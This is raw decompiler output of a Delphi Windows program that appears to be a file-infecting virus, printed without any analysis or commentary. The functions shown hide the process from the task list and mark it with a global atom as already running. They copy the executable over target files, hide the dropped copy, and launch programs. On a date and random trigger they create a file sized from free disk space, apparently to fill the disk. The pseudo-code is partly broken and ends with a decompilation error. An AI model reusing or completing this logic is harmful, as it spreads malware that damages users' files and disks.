  v5 = (LStr *)&loc_41A701;
  System::__linkproc__ LStrArrayClr(v3, 6);
}
// 41A710: using guessed type int dword_41A710[3];
// 41A71C: using guessed type int dword_41A71C[12];
// 41A74C: using guessed type int dword_41A74C[7];
// 41A778: using guessed type int dword_41A778;
// 41EF10: using guessed type int dword_41EF10;

//----- (0041A77C) --------------------------------------------------------
void __usercall sub_41A77C(int a1@<eax>, char **a2@<edx>, LStr *a3@<ecx>)
{
  LStr *v5; // ecx
  unsigned int v6[2]; // [esp-14h] [ebp-18h] BYREF
  LStr *v7; // [esp-Ch] [ebp-10h]
  BYTE *v8; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v8 = 0;
  v7 = (LStr *)&savedregs;
  v6[1] = (unsigned int)&loc_41A7D1;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  System::__linkproc__ LStrClr(a3);
  if ( a1 > 0 )
  {
    do
    {
      System::__linkproc__ LStrCat(&v8, (char *)&dword_41A7E8);
      --a1;
    }
    while ( a1 );
  }
  __linkproc__ LStrAsg(a2, (char *)v8);
  v5 = v7;
  __writefsdword(0, v6[0]);
  v7 = (LStr *)&loc_41A7D8;
  System::__linkproc__ LStrClr(v5);
}
// 41A7E8: using guessed type int dword_41A7E8;

//----- (0041A7EC) --------------------------------------------------------
int __thiscall sub_41A7EC(int (__stdcall *this)())
{
  int result; // eax
  DWORD v2; // eax
  int (__stdcall *v3)(); // [esp+0h] [ebp-4h] BYREF

  v3 = this;
  LOBYTE(result) = sub_418E24("KERNEL32.DLL", "RegisterServiceProcess", &v3);
  if ( (_BYTE)result == 1 )
  {
    v2 = GetCurrentProcessId();
    result = ((int (__stdcall *)(DWORD, int))v3)(v2, 1);
  }
  return result;
}

//----- (0041A848) --------------------------------------------------------
int __thiscall sub_41A848(LStr *this)
{
  LStr *v1; // ecx
  LStr *v2; // ecx
  LStr *v3; // ecx
  LStr *v4; // ecx
  LStr *v5; // ecx
  LStr *v6; // ecx
  LStr *v7; // ecx
  LStr *v8; // ecx
  LStr *v9; // ecx
  int result; // eax
  unsigned int v11[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v11[2] = (unsigned int)&savedregs;
  v11[1] = (unsigned int)&loc_41A8CB;
  v11[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v11);
  System::__linkproc__ LStrClr(this);
  System::__linkproc__ LStrClr(v1);
  System::__linkproc__ LStrClr(v2);
  System::__linkproc__ LStrClr(v3);
  System::__linkproc__ LStrClr(v4);
  System::__linkproc__ LStrClr(v5);
  System::__linkproc__ LStrClr(v6);
  System::__linkproc__ LStrClr(v7);
  System::__linkproc__ LStrClr(v8);
  System::__linkproc__ LStrClr(v9);
  result = 0;
  __writefsdword(0, v11[0]);
  return result;
}
// 41A868: variable 'v1' is possibly undefined
// 41A872: variable 'v2' is possibly undefined
// 41A87C: variable 'v3' is possibly undefined
// 41A886: variable 'v4' is possibly undefined
// 41A890: variable 'v5' is possibly undefined
// 41A89A: variable 'v6' is possibly undefined
// 41A8A4: variable 'v7' is possibly undefined
// 41A8AE: variable 'v8' is possibly undefined
// 41A8B8: variable 'v9' is possibly undefined

//----- (0041A9A4) --------------------------------------------------------
void __usercall __noreturn start(int a1@<edi>)
{
  HANDLE v1; // eax
  HANDLE v2; // eax
  int (__stdcall *v3)(); // ecx
  int v4; // ebx
  char *v5; // ecx
  char *v6; // ecx
  char v7; // zf
  char *v8; // ecx
  char *v9; // ecx
  char *v10; // ecx
  char *v11; // eax
  char *v12; // ecx
  LStr *v13; // ecx
  LStr *v14; // ecx
  char *v15; // eax
  char *v16; // eax
  char *v17; // ecx
  LStr *v18; // ecx
  LStr *v19; // ecx
  unsigned __int64 v20; // st7
  int v21; // eax
  __int64 v22; // rax
  __int64 v23; // rax
  LStr *v24; // ecx
  LStr *v25; // ecx
  LStr *v26; // ecx
  char *v27; // [esp-4h] [ebp-23Ch]
  char *v28; // [esp-4h] [ebp-23Ch]
  char *v29; // [esp-4h] [ebp-23Ch]
  char *v30; // [esp+0h] [ebp-238h]
  char *v31; // [esp+0h] [ebp-238h]
  char *v32; // [esp+0h] [ebp-238h]
  __int64 v33; // [esp+0h] [ebp-238h]
  __int64 v34; // [esp+0h] [ebp-238h]
  char *v35; // [esp+4h] [ebp-234h]
  char *v36; // [esp+4h] [ebp-234h]
  char *v37; // [esp+4h] [ebp-234h]
  unsigned int v38[3]; // [esp+8h] [ebp-230h] BYREF
  unsigned int v39[2]; // [esp+14h] [ebp-224h] BYREF
  LStr *v40; // [esp+1Ch] [ebp-21Ch]
  char *v41; // [esp+2Ch] [ebp-20Ch] BYREF
  char *v42; // [esp+30h] [ebp-208h] BYREF
  char *v43; // [esp+34h] [ebp-204h] BYREF
  BYTE *v44; // [esp+38h] [ebp-200h] BYREF
  char *v45; // [esp+3Ch] [ebp-1FCh] BYREF
  char *v46; // [esp+40h] [ebp-1F8h] BYREF
  char *v47; // [esp+44h] [ebp-1F4h] BYREF
  BYTE *v48; // [esp+48h] [ebp-1F0h] BYREF
  char *v49; // [esp+4Ch] [ebp-1ECh] BYREF
  char *v50; // [esp+50h] [ebp-1E8h] BYREF
  unsigned __int8 v51[4]; // [esp+54h] [ebp-1E4h] BYREF
  char v52[4]; // [esp+58h] [ebp-1E0h] BYREF
  unsigned __int8 v53; // [esp+5Ch] [ebp-1DCh] BYREF
  char v54; // [esp+5Dh] [ebp-1DBh]
  char v55[4]; // [esp+60h] [ebp-1D8h] BYREF
  char v56[4]; // [esp+64h] [ebp-1D4h] BYREF
  char *v57; // [esp+68h] [ebp-1D0h] BYREF
  char *v58; // [esp+6Ch] [ebp-1CCh] BYREF
  char *v59; // [esp+70h] [ebp-1C8h] BYREF
  char *v60; // [esp+74h] [ebp-1C4h] BYREF
  BYTE *v61; // [esp+78h] [ebp-1C0h] BYREF
  char *v62; // [esp+7Ch] [ebp-1BCh] BYREF
  char *v63; // [esp+80h] [ebp-1B8h] BYREF
  BYTE *v64; // [esp+84h] [ebp-1B4h] BYREF
  char *v65; // [esp+88h] [ebp-1B0h] BYREF
  char *v66; // [esp+8Ch] [ebp-1ACh] BYREF
  char *v67; // [esp+90h] [ebp-1A8h] BYREF
  BYTE *v68; // [esp+94h] [ebp-1A4h] BYREF
  BYTE *v69; // [esp+98h] [ebp-1A0h] BYREF
  char *v70; // [esp+9Ch] [ebp-19Ch] BYREF
  char *v71; // [esp+A0h] [ebp-198h] BYREF
  BYTE *v72; // [esp+A4h] [ebp-194h] BYREF
  char *v73; // [esp+A8h] [ebp-190h] BYREF
  char *str2; // [esp+ACh] [ebp-18Ch] BYREF
  BYTE *v75; // [esp+B0h] [ebp-188h] BYREF
  char *v76; // [esp+B4h] [ebp-184h] BYREF
  char *v77; // [esp+B8h] [ebp-180h] BYREF
  BYTE *v78; // [esp+BCh] [ebp-17Ch] BYREF
  BYTE *v79; // [esp+C0h] [ebp-178h] BYREF
  BYTE *v80; // [esp+C4h] [ebp-174h] BYREF
  BYTE *v81; // [esp+C8h] [ebp-170h] BYREF
  BYTE *v82; // [esp+CCh] [ebp-16Ch] BYREF
  BYTE *v83; // [esp+D0h] [ebp-168h] BYREF
  BYTE *v84; // [esp+D4h] [ebp-164h] BYREF
  BYTE *v85; // [esp+D8h] [ebp-160h] BYREF
  char *v86; // [esp+DCh] [ebp-15Ch] BYREF
  char *v87; // [esp+E0h] [ebp-158h] BYREF
  char *v88; // [esp+E4h] [ebp-154h] BYREF
  char *v89; // [esp+E8h] [ebp-150h] BYREF
  char *v90; // [esp+ECh] [ebp-14Ch] BYREF
  char *v91; // [esp+F0h] [ebp-148h] BYREF
  BYTE *v92; // [esp+F4h] [ebp-144h] BYREF
  char *v93; // [esp+F8h] [ebp-140h] BYREF
  BYTE *v94; // [esp+FCh] [ebp-13Ch] BYREF
  char *v95; // [esp+100h] [ebp-138h] BYREF
  char *v96; // [esp+104h] [ebp-134h] BYREF
  char *v97; // [esp+108h] [ebp-130h] BYREF
  char *v98; // [esp+10Ch] [ebp-12Ch] BYREF
  char *v99; // [esp+110h] [ebp-128h] BYREF
  char *v100; // [esp+114h] [ebp-124h] BYREF
  char *v101; // [esp+118h] [ebp-120h] BYREF
  char *v102; // [esp+11Ch] [ebp-11Ch] BYREF
  char *v103; // [esp+120h] [ebp-118h] BYREF
  unsigned __int8 v104[256]; // [esp+124h] [ebp-114h] BYREF
  char *v105; // [esp+224h] [ebp-14h] BYREF
  char *b; // [esp+228h] [ebp-10h] BYREF
  int savedregs; // [esp+238h] [ebp+0h] BYREF

  __linkproc__ InitExe((int)&dword_41A8D4, (struct _EXCEPTION_REGISTRATION_RECORD *)&savedregs);
  v40 = (LStr *)&savedregs;
  v39[1] = (unsigned int)&loc_41B4DD;
  v39[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v39);
  v38[2] = (unsigned int)&savedregs;
  v38[1] = (unsigned int)&loc_41B48E;
  v38[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v38);
  v1 = GetCurrentProcess();
  SetPriorityClass(v1, 0x20u);
  v2 = GetCurrentThread();
  SetThreadPriority(v2, -1);
  sub_41A7EC(v3);
  sub_415FAC((int)dword_41B4F4, 0, &b);
  __linkproc__ LStrAsg(&a, b);
  sub_415EAC((int)a, (char *)dword_41B50C, 0, &v105, 1, 0);
  dword_41EF10 = System::__linkproc__ ValLong((int)v105, (char **)&dword_41EF10) + 1;
  sub_40296C(dword_41EF10, v104);
  sub_4036EC((BYTE **)&dword_41EED8, v104);
  sub_415EAC((int)a, (char *)dword_41B50C, (char *)dword_41EED8, &v103, 1, 1);
  ParamStr(0, (BYTE **)&dword_41EED8);
  sub_415FAC((int)dword_41B518, 0, &v102);
  __linkproc__ LStrAsg(&dword_41EEEC, v102);
  sub_415FAC((int)dword_41B564, 0, &v100);
  sub_415EAC((int)dword_41EEEC, v100, 0, &v101, 0, 0);
  __linkproc__ LStrAsg(&dword_41EEE0, v101);
  sub_415FAC((int)dword_41B578, 0, &v98);
  sub_415EAC((int)dword_41EEEC, v98, 0, &v99, 0, 0);
  __linkproc__ LStrAsg(&dword_41EEE4, v99);
  sub_41609C(1, (BYTE **)&v97);
  __linkproc__ LStrAsg(&dword_41EEF8, v97);
  sub_41609C(2, (BYTE **)&v96);
  __linkproc__ LStrAsg(&dword_41EEE8, v96);
  sub_415FAC((int)dword_41B588, 0, &v95);
  v35 = v95;
  sub_403670(&v94);
  System::__linkproc__ LStrCat3((BYTE **)&dword_41EEF0, v94, v35);
  Sysutils::ExtractFileName((char *)dword_41EED8, &v91);
  Sysutils::LowerCase((int)v91, &v92);
  Sysutils::ChangeFileExt((char *)v92, 0, (BYTE **)&v93);
  __linkproc__ LStrAsg(&dword_41EF08, v93);
  sub_415EAC((int)a, (char *)dword_41B59C, dword_41EF08, &v90, 1, 1);
  sub_415EAC((int)a, (char *)dword_41B5B8, "1.88", &v89, 1, 1);
  sub_415FAC((int)dword_41EF08, 1, &v88);
  __linkproc__ LStrAsg(&dword_41EF00, v88);
  byte_41EF20 = 0;
  v4 = 0;
  byte_41EF21 = 0;
  System::__linkproc__ LStrCmp(v5, (char *)::str2);
  if ( v7
    || (System::__linkproc__ LStrCmp(v6, (char *)dword_41B5D4), v7)
    || (System::__linkproc__ LStrCmp(v8, (char *)dword_41B5E4), v7) )
  {
    ParamStr(1, &v85);
    ParamStr(2, &v84);
    ParamStr(3, &v83);
    ParamStr(4, &v82);
    ParamStr(5, &v81);
    ParamStr(6, &v80);
    ParamStr(7, &v79);
    ParamStr(8, &v78);
    System::__linkproc__ LStrCatN(&v86, 15);
    Sysutils::Trim(v86, &v87);
    __linkproc__ LStrAsg(&dword_41EF04, v87);
    sub_415FAC((int)dword_41B610, 0, &v77);
    System::__linkproc__ LStrCatN(&dword_41EEF4, 3);
    System::__linkproc__ LStrCmp(v9, (char *)dword_41B5E4);
    if ( v7 )
    {
      System::__linkproc__ LStrCatN(&v76, 3);
      v11 = sub_4038E8(v76);
      WinExec(v11, 1u);
    }
    System::__linkproc__ LStrCmp(v10, (char *)::str2);
    if ( v7 )
    {
      System::__linkproc__ LStrCatN(&dword_41EF00, 3);
      Sysutils::LowerCase((int)dword_41EEE4, &v75);
      System::__linkproc__ LStrCat(&v75, (char *)dword_41B604);
      ParamStr(1, &v72);
      Sysutils::ExtractFilePath((char *)v72, &v73);
      Sysutils::LowerCase((int)v73, (BYTE **)&str2);
      System::__linkproc__ LStrCmp(v12, str2);
      if ( v7 )
      {
        v36 = dword_41EF00;
        sub_41A77C(90, &v71, v13);
        v30 = v71;
        sub_41A77C(90, &v70, v14);
        v27 = v70;
        ParamStr(1, &v69);
        if ( (unsigned __int8)sub_4171C0((char *)dword_41EED8, (char *)v69, 0, 1, (int)v27, (int)v30, v36) )
        {
          ParamStr(1, &v68);
          v31 = sub_4038E8((char *)v68);
          v15 = sub_4038E8(dword_41EF00);
          CopyFileA(v15, v31, 0);
        }
      }
      v16 = sub_4038E8(dword_41EF04);
      WinExec(v16, 1u);
    }
  }
  else
  {
    sub_416A1C((char *)dword_41EED8, (char *)dword_41B624, 2, &v67);
    System::__linkproc__ LStrCmp(v17, (char *)dword_41B630);
    if ( v7 )
    {
      sub_416A1C((char *)dword_41EED8, (char *)&dword_41B63C, 8, &v66);
      dword_41EF0C = System::__linkproc__ ValLong((int)v66, (char **)&dword_41EF0C);
      sub_416C54((char *)dword_41EED8, dword_41EF0C);
      if ( !GlobalFindAtomA("`s}Onw") )
      {
        sub_415FAC((int)dword_41B650, 0, &v65);
        __linkproc__ LStrAsg(&dword_41EEF4, v65);
        System::__linkproc__ LStrCat3(&v64, (BYTE *)dword_41EEF0, dword_41EEF4);
        if ( !sub_4071A8((char *)v64) )
        {
          v37 = dword_41EEF4;
          sub_41A77C(90, &v63, v18);
          v28 = v63;
          sub_41A77C(90, &v62, v19);
          sub_416478(
            (char *)dword_41EED8,
            0,
            (BYTE *)dword_41EEF0,
            0,
            0,
            dword_41EF0C,
            (int)v62,
            (int)v28,
            (int)dword_41B664,
            v37);
          System::__linkproc__ LStrCat3(&v61, (BYTE *)dword_41EEF0, dword_41EEF4);
          Sysutils::FileSetAttr(2u, (char *)v61);
        }
        System::__linkproc__ LStrCat3((BYTE **)&dword_41EED8, (BYTE *)dword_41EEF0, dword_41EEF4);
      }
      byte_41EF21 = 1;
    }
    else
    {
      byte_41EF20 = 1;
    }
  }
  sub_418880((char *)dword_41EED8);
  if ( dword_41EF10 > 8000 )
    LOBYTE(v4) = 1;
  if ( ((unsigned __int8)v4 | (GlobalFindAtomA("`s}Onw") == 0) || byte_41EF20) && !byte_41EF21 )
  {
    GlobalAddAtomA("`s}Onw");
    sub_415EAC((int)a, (char *)dword_41B67C, (char *)dword_41B670, &v60, 1, 1);
    sub_415EAC((int)a, (char *)&dword_41B694, (char *)dword_41B688, &v59, 1, 1);
    sub_415EAC((int)a, (char *)dword_41B50C, 0, &v58, 1, 0);
    dword_41EF10 = System::__linkproc__ ValLong((int)v58, (char **)&dword_41EF10);
    *(double *)&v20 = Sysutils::Now();
    sub_408C78((int)&v57, v20, HIDWORD(v20));
    __linkproc__ LStrAsg(&dword_41EEF4, v57);
    v56[1] = *dword_41EEF4;
    v56[0] = 1;
    sub_402848(v55, v56);
    v54 = dword_41EEF4[1];
    v53 = 1;
    __linkproc__ PStrNCat((unsigned __int8 *)v55, &v53, 2u);
    System::__linkproc__ AStrCmp((int)v55, (int)&dword_41B698, (unsigned __int8)v55[0] + 1);
    if ( v7 )
    {
      v54 = dword_41EEF4[3];
      v53 = 1;
      sub_402848(v52, &v53);
      v51[1] = dword_41EEF4[4];
      v51[0] = 1;
      __linkproc__ PStrNCat((unsigned __int8 *)v52, v51, 2u);
      System::__linkproc__ AStrCmp((int)v52, (int)dword_41B69C, (unsigned __int8)v52[0] + 1);
      if ( v7 )
      {
        if ( sub_4028F4(0x14u) == 8 )
          byte_41EF20 = 1;
      }
    }
    if ( byte_41EF20 )
    {
      sub_415EAC((int)a, (char *)dword_41B6A8, (char *)dword_41B670, &v50, 1, 1);
      TObject_Create(&off_40BBB4);
      dword_41EF14 = v21;
      sub_415FAC((int)dword_41B6B4, 0, &v49);
      v32 = v49;
      sub_403670(&v48);
      System::__linkproc__ LStrCat(&v48, (char *)dword_41B6C0);
      sub_417928(v48, v32, (int)&dword_41EF14, 1);
      sub_402BDC((_DWORD *)dword_41EF14);
      LOBYTE(v4) = 1;
    }
    if ( (_BYTE)v4 )
    {
      sub_415EAC((int)a, "FC41", 0, &v47, 1, 0);
      if ( !v47 && sub_4028F4(0x32u) == 8 )
      {
        sub_415EAC((int)a, (char *)dword_41B6A8, (char *)dword_41B624, &v46, 1, 1);
        if ( byte_41EF20 )
          dword_41EF10 = 3;
        else
          dword_41EF10 = 1;
        if ( sub_4028F4(2u) == 1 )
          __linkproc__ LStrAsg(&dword_41EEF4, (char *)::b);
        else
          __linkproc__ LStrAsg(&dword_41EEF4, (char *)dword_41B710);
        v33 = dword_41EF10;
        v22 = Sysutils::DiskFree(0) / 3;
        LODWORD(v23) = System::__linkproc__ _llmul(v22, v33, SHIDWORD(v33));
        v34 = v23;
        sub_415FAC((int)dword_41EEF4, 0, &v45);
        System::__linkproc__ LStrCat((BYTE **)&v45, (char *)dword_41B5F8);
        v29 = v45;
        sub_415FAC((int)dword_41B774, 0, &v43);
        System::__linkproc__ LStrCat3(&v44, (BYTE *)dword_41EEF0, v43);
        sub_418C48((char *)v44, (int)v29, v4, (int)&dword_41EF10, v34);
        sub_415EAC((int)a, "FC41", (char *)dword_41B670, &v42, 1, 1);
      }
    }
    sub_41A5E4(v4, a1, (int)&dword_41EF10);
    sub_418DC8("`s}Onw");
    sub_415EAC((int)a, (char *)dword_41B67C, (char *)dword_41B688, &v41, 1, 1);
  }
  __writefsdword(0, v38[0]);
  v24 = v40;
  __writefsdword(0, v39[0]);
  v40 = (LStr *)&loc_41B4E4;
  System::__linkproc__ LStrArrayClr(v24, 10);
  System::__linkproc__ LStrArrayClr(v25, 47);
  System::__linkproc__ LStrArrayClr(v26, 2);
  System::__linkproc__ Halt0();
}
// 41A9FC: variable 'v3' is possibly undefined
// 41AC6C: variable 'v5' is possibly undefined
// 41AC71: variable 'v7' is possibly undefined
// 41AC7D: variable 'v6' is possibly undefined
// 41AC8E: variable 'v8' is possibly undefined
// 41ADD9: variable 'v9' is possibly undefined
// 41AE1E: variable 'v10' is possibly undefined
// 41AEA9: variable 'v12' is possibly undefined
// 41AEC5: variable 'v13' is possibly undefined
// 41AEDC: variable 'v14' is possibly undefined
// 41AF7B: variable 'v17' is possibly undefined
// 41B037: variable 'v18' is possibly undefined
// 41B04E: variable 'v19' is possibly undefined
// 41B2B6: variable 'v21' is possibly undefined
// 41B3D8: variable 'v23' is possibly undefined
// 41B4CA: variable 'v25' is possibly undefined
// 41B4D7: variable 'v26' is possibly undefined
// 40BBB4: using guessed type void *off_40BBB4;
// 41A8D4: using guessed type int dword_41A8D4;
// 41B4F4: using guessed type int dword_41B4F4[6];
// 41B50C: using guessed type int dword_41B50C[3];
// 41B518: using guessed type int dword_41B518[19];
// 41B564: using guessed type int dword_41B564[3];
// 41B578: using guessed type int dword_41B578[4];
// 41B588: using guessed type int dword_41B588[5];
// 41B59C: using guessed type int dword_41B59C[3];
// 41B5B8: using guessed type int dword_41B5B8[3];
// 41B5F8: using guessed type int dword_41B5F8[3];
// 41B604: using guessed type int dword_41B604[3];
// 41B610: using guessed type int dword_41B610[5];
// 41B624: using guessed type int dword_41B624[3];
// 41B63C: using guessed type int dword_41B63C;
// 41B650: using guessed type int dword_41B650[5];
// 41B664: using guessed type int dword_41B664[3];
// 41B670: using guessed type int dword_41B670[3];
// 41B67C: using guessed type int dword_41B67C[3];
// 41B688: using guessed type int dword_41B688[3];
// 41B694: using guessed type int dword_41B694;
// 41B698: using guessed type int dword_41B698;
// 41B69C: using guessed type int dword_41B69C[3];
// 41B6A8: using guessed type int dword_41B6A8[3];
// 41B6B4: using guessed type int dword_41B6B4[3];
// 41B6C0: using guessed type int dword_41B6C0[3];
// 41B774: using guessed type int dword_41B774[5];
// 41EED8: using guessed type int dword_41EED8;
// 41EEF0: using guessed type int dword_41EEF0;
// 41EF0C: using guessed type int dword_41EF0C;
// 41EF10: using guessed type int dword_41EF10;
// 41EF14: using guessed type int dword_41EF14;
// 41EF20: using guessed type char byte_41EF20;
// 41EF21: using guessed type char byte_41EF21;

// nfuncs=976 queued=759 decompiled=759 lumina nreq=0 worse=0 better=0
#error "There were 2 decompilation failure(s) on 759 function(s)"
